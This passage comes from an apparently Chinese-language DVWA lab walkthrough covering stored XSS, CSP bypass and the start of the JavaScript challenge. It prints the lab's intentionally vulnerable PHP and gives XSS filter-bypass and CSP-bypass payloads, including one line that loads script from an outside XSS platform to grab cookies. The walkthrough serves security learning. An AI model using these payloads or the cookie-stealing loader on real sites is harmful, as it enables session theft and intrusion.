mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;XSS&#39;);&lt;&#x2F;script&gt;</span><br><span class="line">&lt;sCRiPt&#x2F;SrC&#x3D;&#x2F;&#x2F;xss.pt&#x2F;Lq8N&gt;  &#x2F;&#x2F;再次打开时会调用导致弹Cookie等</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/i8mPtOp7K6kG5sX.png"></p><h2 id="Medium-11"><a href="#Medium-11" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将<code>message</code>中得标签去除，将<code>name</code>的<code>&lt;script&gt;</code>替换成空。<code>name</code>变量更好突破，双写，大小写，换成其他标签都可以。</p><p>下面给出两个payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. name大小写双写绕过,但因为name存在js的长度限制，可以用burp接收</span><br><span class="line">txtName&#x3D;&lt;scRipt&gt;alert(&#39;XSS&#39;);&lt;&#x2F;sCript&gt;&amp;mtxMessage&#x3D;2&amp;btnSign&#x3D;Sign+Guestbook</span><br><span class="line"></span><br><span class="line">2. name替换其他标签</span><br><span class="line">txtName&#x3D;&lt;img src&#x3D;x onerror&#x3D;alert(&#39;XSS&#39;)&gt;&amp;mtxMessage&#x3D;12138</span><br></pre></td></tr></table></figure><h2 id="High-10"><a href="#High-10" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>name也是用了一个正则，把<code>&lt;script&gt;</code>大小写双写都包含了，但是一样可以利用其它标签和事件来触发js。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="Impossible-10"><a href="#Impossible-10" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = stripslashes( $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $name = htmlspecialchars( $name );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:message&#x27;</span>, $message, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:name&#x27;</span>, $name, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，通过使用htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。</p><h1 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a>CSP Bypass</h1><h2 id="Low-12"><a href="#Low-12" class="headerlink" title="Low"></a>Low</h2><p>首先，何为CSP？CSP是内容安全策略（Content Security Policy），是一种声明机制，允许Web开发者在其应用程序上指定多个安全限制，由支持的用户代理（浏览器）来负责强制执行。CSP旨在“作为开发人员可以使用的工具，以各种方式保护其应用程序，减轻内容注入漏洞的风险和减少它们的应用程序执行的特权”。</p><p>实际应用中，配置了CSP策略，往往在请求头中出现<code>Content-Security-Policy</code> 和 <code>X-Content-Security-Policy</code> 或者 <code>X-Webkit-CSP</code>（X-*不推荐使用）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;&quot;</span>; <span class="comment">// allows js from self, pastebin.com, jquery and google analytics.</span></span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://pastebin.com/raw/R570EE00</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &lt;script src=&#x27;&quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;&#x27;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure><p><code>script-src &#39;self&#39;</code>是指允许同站的资源调用运行（js等），即这段代码使用了CSP信任了以下网站，这些网站的内容CSP都不会拦截</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本网站的资源</span><br><span class="line">https:&#x2F;&#x2F;pastebin.com  </span><br><span class="line">example.com </span><br><span class="line">code.jquery.com </span><br><span class="line">https:&#x2F;&#x2F;ssl.google-analytics.com</span><br></pre></td></tr></table></figure><p>于是我们可以利用其中一些可控的网站，写一些XSS等危险内容，再通过该网站调用，即利用白名单中的网站可控数据来打XSS。</p><p>发现<code>https://pastebin.com</code>是一个代码编辑网站，可以写代码存到这个网站的服务器，并且上面的代码中直接通过js引用，所以在这个网站中写一段<code>alert(&quot;hahaha&quot;)</code>，将地址提交到dvwa中即可弹窗。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;pastebin.com</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/sDQ3twlSjxmPfqA.png"></p><h2 id="Medium-12"><a href="#Medium-12" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Disable XSS protections so that inline alert boxes will work</span></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>​    <code>unsafe-inline</code>，允许使用内联资源，如内联<code>&lt; script&gt;</code>元素，<code>javascript:URL</code>，内联事件处理程序（如onclick）和内联<code>&lt; style&gt;</code>元素。必须包括单引号。<br>​    <code>nonce-source</code>，仅允许特定的内联脚本块，<code>nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA&quot;</code></p><p>允许通过<code>&lt;script nonce=&quot;***&quot;&gt;</code>,来执行<code>***</code>部分的代码和脚本。</p><p>更多CSP<code>SourceValue</code>，参见<a href="http://cosmos-admin.hgame.day-day.work/">http://cosmos-admin.hgame.day-day.work</a></p></blockquote><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script nonce&#x3D;&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA&#x3D;&quot;&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>使用 ‘unsafe-inline’ 和 ‘unsafe-eval’ 都是不安全的，它们会使您的网站有跨站脚本攻击风险。</p></blockquote><h2 id="High-11"><a href="#High-11" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;The page makes a call to &#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现这个文件本身没什么问题，但是调用了一个<code>jsonp.php</code>，跟进一下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (array_key_exists (<span class="string">&quot;callback&quot;</span>, $_GET)) &#123;</span><br><span class="line">$callback = $_GET[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$outp = <span class="keyword">array</span> (<span class="string">&quot;answer&quot;</span> =&gt; <span class="string">&quot;15&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $callback . <span class="string">&quot;(&quot;</span>.json_encode($outp).<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现<code>$callback</code>可控，而且直接拼接输出。回头一看，原页面中<code>include</code>也是可控的，而且是直接拼接到HTML body中输出的。但是因为有CSP，不可以直接无脑的去打payload</p><p><img src="https://i.loli.net/2020/03/03/Nndsi53TPAmjGwL.png"></p><p>联系<code>jsonp.php的$callback</code>，且符合CSP的同源规则，可以这样利用：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include&#x3D;&lt;script src&#x3D;&quot;source&#x2F;jsonp.php?callback&#x3D;alert(&#39;XSS&#39;);&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>这样由include去调用<code>jsonp.php</code>，而<code>jsonp.php</code>中的参数可控且直接拼接，<code>json.php</code>,没有用CSP规则，这样就绕开了CSP完成了XSS攻击。</p><h2 id="Impossible-11"><a href="#Impossible-11" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">$outp = <span class="keyword">array</span> (<span class="string">&quot;answer&quot;</span> =&gt; <span class="string">&quot;15&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;solveSum (&quot;</span>.json_encode($outp).<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>jsonp_impossible.php</code>修复了<code>call_back</code>可控的问题。</p><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">MD5 code from here</span></span><br><span class="line"><span class="string">https://github.com/blueimp/JavaScript-MD5</span></span><br><span class="line"><span class="string">*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">!function(n)&#123;&quot;use strict&quot;;function t(n,t)&#123;var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r&#125;function r(n,t)&#123;return n&lt;&lt;t|n&gt;&gt;&gt;32-t&#125;function e(n,e,o,u,c,f)&#123;return t(r(t(t(e,n),t(u,f)),c),o)&#125;function o(n,t,r,o,u,c,f)&#123;return e(t&amp;r|~t&amp;o,n,t,u,c,f)&#125;function u(n,t,r,o,u,c,f)&#123;return e(t&amp;o|r&amp;~o,n,t,u,c,f)&#125;function c(n,t,r,o,u,c,f)&#123;return e(t^r^o,n,t,u,c,f)&#125;function f(n,t,r,o,u,c,f)&#123;return e(r^(t|~o),n,t,u,c,f)&#125;function i(n,r)&#123;n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]&#125;function a(n)&#123;var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r&#125;function d(n)&#123;var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r&#125;function h(n)&#123;return a(i(d(n),8*n.length))&#125;function l(n,t)&#123;var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))&#125;function g(n)&#123;var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e&#125;function v(n)&#123;return unescape(encodeURIComponent(n))&#125;function m(n)&#123;return h(v(n))&#125;function p(n)&#123;return g(m(n))&#125;function s(n,t)&#123;return l(v(n),v(t))&#125;function C(n,t)&#123;return g(s(n,t))&#125;function A(n,t,r)&#123;return t?r?s(t,n):C(t,n):r?m(n):p(n)&#125;&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function()&#123;return A&#125;):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A&#125;(this);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function rot13(inp) &#123;</span></span><br><span class="line"><span class="string">        return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);&#125;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function generate_token() &#123;</span></span><br><span class="line"><span class="string">        var phrase = document.getElementById(&quot;phrase&quot;).value;</span></span><br><span class="line"><span class="string">        